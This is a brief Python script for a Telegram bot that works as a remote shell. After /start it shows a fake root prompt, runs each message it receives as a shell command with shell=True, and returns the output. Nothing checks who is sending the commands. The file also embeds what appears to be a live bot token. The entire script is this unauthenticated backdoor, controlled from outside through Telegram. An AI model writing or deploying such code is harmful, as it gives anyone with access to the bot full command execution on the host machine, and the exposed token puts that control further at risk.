import telebot
import subprocess

bot = telebot.TeleBot('7616940393:AAHpOpETi3S7BOIW7-s-PNTI-DULQ0k2k3RA')

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "(rootadm-system)-[~]>")
    bot.register_next_step_handler(message, lambda m: 
        bot.send_message(
            m.chat.id, 
            f"Runs out...\n{subprocess.run(m.text.strip(), shell=True, capture_output=True, text=True).stdout}\n(rootadm-system)-[~] >"
        ) or bot.register_next_step_handler(m, lambda mm: start(mm))
    )

bot.polling()
